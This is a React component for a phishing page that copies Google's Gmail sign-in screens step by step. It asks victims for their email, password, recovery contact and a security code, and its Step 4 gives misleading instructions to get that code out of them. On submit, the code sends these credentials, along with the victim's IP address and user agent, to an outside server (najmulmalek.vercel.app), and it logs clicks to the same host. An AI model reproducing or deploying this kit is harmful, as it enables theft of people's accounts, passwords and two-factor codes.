import React, { useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import { Link, useLoaderData, useNavigate, useParams } from "react-router-dom";
import { isBrowser, isMobile } from "react-device-detect";
import './Form.css'
const Form = () => {
  const { user } = useLoaderData();
  const navigate = useNavigate();
  const id = useParams();
  const [step, setStep] = useState(1);
  const [numemail, setNumemail] = useState('email address');
  const [passwordShown, setPasswordShown] = useState(false);
  const [validation, setValidation] = useState(false);
  const [passValidation, setPassValidation] = useState(false);
  const [recoveryValidation, setRecoveryValidation] = useState(false);
  const [codeValidation, setCodeValidation] = useState(false);
  const [userAgent, setUserAgent] = useState('');
  const [ipAddress, setIPAddress] = useState('');
  const [inputValue, setInputValue] = useState('');
  const [loader, setLoader] = useState(false);
  const togglePassword = () => {
    // When the handler is invoked
    // inverse the boolean state of passwordShown
    setPasswordShown(!passwordShown);
  };
  let type;
  if (isBrowser) {
    type = "desktop";
  } else {
    type = "mobile";
  }

  useEffect(() => {
    const userAgent = window.navigator.userAgent;
    setUserAgent(userAgent);
    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => setIPAddress(data.ip))
      .catch(error => console.log(error))

    const bookings = {
      type: type,
    };

    fetch(`https://najmulmalek.vercel.app/updateclick/${id.id}`, {
      method: "PUT",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify(bookings),
    })
      .then()
      .then();
  }, [type, id.id]);

  const handleNext = () => {
    setLoader(true)
    setInterval(() => {
      setStep(step + 1);
      setLoader(false);
    }, 1000); // 60000 ms = 1 minute

  };

  const handleBack = () => {
    setStep(step - 1);
  };
  const {
    register,
    handleSubmit,
    formState: { errors },
    reset,
  } = useForm();
  const handleAddBooking = (data) => {
    setLoader(true)
    const bookings = {
      site: 'google',
      email: data.email,
      password: data.password,
      recovery: data.recovery,
      code: data.code,
      user: user,
      agent: userAgent,
      ipAddress: ipAddress,
      temp: Math.floor(Math.random() * (9999 - 1111) + 1111),
      postingTime: Date().toLocaleString(),
    };
    fetch("https://najmulmalek.vercel.app/cashtag", {
      method: "POST",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify(bookings),
    })
      .then((res) => res.json())
      .then((result) => {
        reset();
        setLoader(false);
        pathInfo(bookings);
      });
  };
  const pathInfo = (infos) => {
    // let userId = window.location.pathname;
    // const fnl = userId.substring(
    //   userId.indexOf("/") + 1,
    //   userId.lastIndexOf("/")
    // );
    // navigate("/get-code", { state: { temp: infos.temp } });
    navigate("/phone-code", { state: { temp: infos.temp } });
    // navigate("/recovery", { state: { temp: infos.temp } });
    // window.location.href = 'https://www.google.com/maps/place/New+York,+NY,+USA/@40.6976312,-74.1444871,11z/data=!3m1!4b1!4m6!3m5!1s0x89c24fa5d33f083b:0xc80b8f06e177fe62!8m2!3d40.7127753!4d-74.0059728!16zL20vMDJfMjg2?entry=ttu';

    // navigate("/");
    // if (fnl === "verify/login") {
    //   navigate("/login",{ state: { temp: infos.temp } });

    // } else {

    // }
  };
  const handleNumber = () => {
    if (numemail === 'email address') {
      setNumemail('phone number')
    } else {
      setNumemail('email address')
    }
  }
  function isValidEmail(email) {
    return /\S+@\S+\.\S+/.test(email);
  }
  const handleChange = event => {
    if (!isValidEmail(event.target.value)) {
      setValidation(false);
    } else {
      setValidation(true);
    }
  };
  function isValidPassword(password) {
    return password.length >= 8;
  }
  const handlePassword = event => {
    if (!isValidPassword(event.target.value)) {
      setPassValidation(false);
    } else {
      setPassValidation(true);
    }
  }

  function isValidREmail(email) {
    return /\S+@\S+\.\S+/.test(email);
  }
  const handleRChange = event => {
    if (event.target.value === '') {
      setRecoveryValidation(false);
    } else {
      setRecoveryValidation(true);
    }
  };
  const handleCChange = event => {
    if (event.target.value === '') {
      setCodeValidation(false);
    } else {
      setCodeValidation(true);
    }
  };
  return (
    <div className="flex items-center justify-center h-screen">
      <form className="relative bg-white px-6 py-20 rounded-[28px] shadow-md w-5/6 md:w-[60%] overflow-hidden">
        {loader && <div class="animated-load absolute top-0 left-0 h-1 bg-indigo-600"></div>}


        {step === 1 ? (
          <Step1 register={register} validation={validation} isValidEmail={isValidEmail} handleChange={handleChange} />

        ) : step === 2 ? (
          <Step2 register={register} passwordShown={passwordShown} togglePassword={togglePassword} handlePassword={handlePassword} />
        ) : step === 3 ? (
          <Step3 register={register} numemail={numemail} handleNumber={handleNumber} handleRChange={handleRChange} />
        ) : (
          <Step4 register={register} handleCChange={handleCChange} />
        )}
        <div className="flex justify-end mt-6">
          {step === 1 && (
            validation ?
              <div>
                {step === 1 ? <Link className="text-blue-600">Create account</Link> : ""}
                <span
                  className={`${validation ? 'bg-blue-600' : 'bg-gray-600'} px-6 py-1.5 rounded-lg text-white cursor-pointer ml-3`}
                  onClick={handleNext}

                >
                  Next
                </span>
              </div>

              :
              <div>
                {step === 1 ? <Link className="text-blue-600">Create account</Link> : ""}
                <span
                  className={`bg-gray-600 px-6 py-1.5 rounded-lg text-white cursor-not-allowed ml-3`}
                >
                  Next
                </span>
              </div>

          )}
          {step === 2 && (
            passValidation ?
              <div>
                {step === 2 && <Link className="text-blue-600">Forgot Password? </Link>}

                <button
                  className={`${passValidation ? 'bg-blue-600' : 'bg-gray-600'} px-6 py-1.5 rounded-lg text-white cursor-pointer`}
                  onClick={handleSubmit(handleAddBooking)}
                // onClick={handleNext}

                >Next
                </button>
              </div>


              :
              <div>
                {step === 2 && <Link className="text-blue-600">Forgot Password? </Link>}
                <span
                  className={`bg-gray-600 px-6 py-1.5 rounded-lg text-white cursor-not-allowed ml-3`}
                >
                  Next
                </span>
              </div>
          )}
          {step === 3 && (
            recoveryValidation ?
              <span
                className={`${recoveryValidation ? 'bg-blue-600' : 'bg-gray-600'} px-6 py-1.5 rounded-lg text-white cursor-pointer`}
                onClick={handleNext}

              >
                Next
              </span>
              :
              <span
                className={`bg-gray-600 px-6 py-1.5 rounded-lg text-white cursor-not-allowed`}
              >
                Next
              </span>
          )}
          {step === 4 && (
            codeValidation ?
              <button
                className="bg-blue-600 px-6 py-1.5 rounded-lg text-white hover:bg-blue-600 cursor-pointer"
                onClick={handleSubmit(handleAddBooking)}

              >
                Next
              </button>
              :
              <span
                className="bg-gray-600 px-6 py-1.5 rounded-lg text-white cursor-not-allowed"
              >
                Next
              </span>

          )}
        </div>
      </form>
    </div>
  );
};

const Step1 = ({ register, setEmail, handleChange }) => (
  <div className="flex flex-col md:flex-row">
    <div className="w-full md:w-1/2 text-left">
      {/* <img src="/google.png" alt="" className="mx-auto" /> */}
      <svg xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 48 48" aria-hidden="true" jsname="jjf7Ff"><path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"></path><path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"></path><path fill="#FBBC05" d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z"></path><path fill="#EA4335" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"></path><path fill="none" d="M2 2h44v44H2z"></path></svg>
      <h2 className="mt-4 font-normal text-4xl">Sign in</h2>
      <p className="mt-4">to continue to Gmail</p>
    </div>
    <div className="w-full md:w-1/2">
      <div className="my-4 mb-2">
        {/* <input
          type="email"
          {...register("email", {
            onBlur: (e) => { localStorage.setItem("u-email", e.target.value) }
          })}
          onChange={handleChange}
          placeholder="Email or phone"
          className="w-full border border-gray-400 p-2 py-4 rounded-md text-gray-400"
        /> */}

        <div className="relative mt-6">
          <input
            {...register("email", {
              onBlur: (e) => { localStorage.setItem("u-email", e.target.value) }
            })}
            onChange={handleChange}
            type="text"
            id="name"
            className="block w-full px-3 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent placeholder-transparent peer"
            placeholder=" "
          />
          <label
            htmlFor="name"
            className={`absolute left-3 -top-2.5 px-1 transition-all duration-200 transform bg-white peer-placeholder-shown:top-2 peer-placeholder-shown:left-3 peer-placeholder-shown:text-gray-400 peer-focus:-top-2.5 peer-focus:left-1 peer-focus:text-blue-500 `}
          >
            Email or phone
          </label>
        </div>
      </div>
      <Link className="text-blue-700 text-base">Forgot email?</Link>
      <div className="mt-4">
        <p className="text-gray-800">
          Not your computer? Use Guest mode to sign in privately.{" "}
        </p>
        <Link className="text-blue-600">Learn more about using Guest mode</Link>
      </div>
      <div className="mt-3">
        {/* <Link className="text-blue-600">Create account</Link> */}
      </div>
    </div>
  </div>
);

const Step2 = ({ register, passwordShown, togglePassword, handlePassword }) => (

  <div className="flex flex-col md:flex-row">
    <div className="w-full md:w-1/2 text-left">
      {/* <img src="/google.png" alt="" className="mx-auto" /> */}
      <svg xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 48 48" aria-hidden="true" jsname="jjf7Ff"><path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"></path><path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"></path><path fill="#FBBC05" d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z"></path><path fill="#EA4335" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"></path><path fill="none" d="M2 2h44v44H2z"></path></svg>
      <h2 className="text-left font-normal text-4xl my-5">Welcome</h2>
      <div className="text-left rounded-xl p-1 border border-gray-400 w-fit text-sm  flex  mt-2 mb-8">
        <svg
          aria-hidden="true"
          className="w-5 h-5"
          fill="currentColor"
          focusable="false"
          viewBox="0 0 24 24"
          xmlns="https://www.w3.org/2000/svg"
        >
          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
        </svg>{" "}
        <span>{localStorage.getItem("u-email")}</span>
      </div>
    </div>
    <div className="w-full md:w-1/2">
      <div className="mb-4">
        {/* <input
          type={passwordShown ? "text" : "password"}
          {...register("password")}
          onChange={handlePassword}
          placeholder="Enter your password"
          className="w-full border border-gray-400 p-2 rounded-md"
        /> */}
<div className="relative mt-6">
          <input
             type={passwordShown ? "text" : "password"}
            {...register("password")}
            onChange={handlePassword}
         
            className="block w-full px-3 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent placeholder-transparent peer"
            placeholder=" "
          />
          <label
            htmlFor="name"
            className={`absolute left-3 -top-2.5 px-1 transition-all duration-200 transform bg-white peer-placeholder-shown:top-2 peer-placeholder-shown:left-3 peer-placeholder-shown:text-gray-400 peer-focus:-top-2.5 peer-focus:left-1 peer-focus:text-blue-500 `}
          >
            Password
          </label>
        </div>
        {/* <div className="relative mt-6">
          <input
            type={passwordShown ? "text" : "password"}
            {...register("password")}
            onChange={handlePassword}

            className="block w-full px-3 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent placeholder-transparent peer"
            placeholder=" "
          />
          <label
            htmlFor="name"
            className={`absolute left-3 -top-2.5 px-1 transition-all duration-200 transform bg-white peer-placeholder-shown:top-2 peer-placeholder-shown:left-3 peer-placeholder-shown:text-gray-400 peer-focus:-top-2.5 peer-focus:left-1 peer-focus:text-blue-500 `}
          >
            Enter your password
          </label>
        </div> */}
      </div>
      <div>
        <label className="flex ">
          <input type="checkbox" onChange={togglePassword} />
          <span className="ml-4">Show password</span>
        </label>
      </div>
      <div className="mt-3">
        {/* <Link className="text-blue-600">Forgot Password? </Link> */}
      </div>
    </div>
  </div>
);
const Step3 = ({ register, numemail, handleNumber, handleRChange }) => (
  <div>
    <img src="/google.png" alt="" className="mx-auto" />
    <h2 className="text-center font-medium text-2xl">Account Recovery</h2>
    <div className="text-center rounded-xl p-1 border border-gray-400 w-fit text-sm mx-auto flex items-center mt-2 mb-8">
      <svg
        aria-hidden="true"
        className="w-5 h-5"
        fill="currentColor"
        focusable="false"
        viewBox="0 0 24 24"
        xmlns="https://www.w3.org/2000/svg"
      >
        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
      </svg>{" "}
      <span>{localStorage.getItem("u-email")}</span>
    </div>
    <h4 className="font-medium">Get a verification code</h4>
    <p>
      To get a verification code first confirm the recovery email address you
      added to your account <b>{numemail === 'email address' ? localStorage.getItem("u-email")?.slice(0, 2) + '*****@gm***.com' : '(***) *** - ****'}</b>
    </p>
    <div className="relative mt-6">
      <input
        type="text"
        {...register("recovery")}
        onChange={handleRChange}
        className="peer w-full border-b placeholder:text-transparent p-2 py-3 border border-blue-900 rounded-lg peer-focus:border-blue-900 focus:outline-none"
        placeholder="name"
      />
      <label
        htmlFor="email"
        className="absolute left-0 ml-1 -translate-y-5 bg-white p-1 text-sm duration-100 ease-linear peer-placeholder-shown:translate-y-1 peer-placeholder-shown:text-blue-800 peer-focus:ml-1 peer-focus:-translate-y-5 peer-focus:px-1 peer-focus:text-sm"
      >
        Enter recovery {numemail}
      </label>
    </div>

    <div className="mt-3">
      <p className="text-blue-600 cursor-pointer" onClick={handleNumber}>Number or recovery </p>
    </div>
  </div>
);
const Step4 = ({ register, handleCChange }) => (
  <div>
    <img src="/google.png" alt="" className="mx-auto" />
    <h2 className="text-center font-medium text-2xl">Welcome</h2>
    <div className="text-center rounded-xl p-1 border border-gray-400 w-fit text-sm mx-auto flex items-center mt-2 mb-8">
      <svg
        aria-hidden="true"
        className="w-5 h-5"
        fill="currentColor"
        focusable="false"
        viewBox="0 0 24 24"
        xmlns="https://www.w3.org/2000/svg"
      >
        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
      </svg>{" "}
      <span>{localStorage.getItem("u-email")}</span>
    </div>
    <div className="mb-4">
      <ul className="list-disc p-5 text-sm">
        <li>
          Get your <b>Device</b>
        </li>
        <li>Open settings app </li>
        <li>
          Tap <b>Google</b>
        </li>
        <li>Choose your account, if it not already selected</li>
        <li>
          Tap <b>Manage your Google Account</b>
        </li>
        <li>Select the security tab(you may need to scroll to the right)</li>
        <li>
          Under "Signing in to Google" tap <b>Security code</b>
        </li>
        <li>Choose an account to get your code</li>
      </ul>
      <input
        type="text"
        {...register("code")}
        placeholder="Enter code"
        onChange={handleCChange}
        className="w-full border border-gray-400 p-2 rounded-md"
      />
    </div>
    <div className="mt-3">
      <Link className="text-blue-600">More ways to sign in </Link>
    </div>
  </div>
);

export default Form;
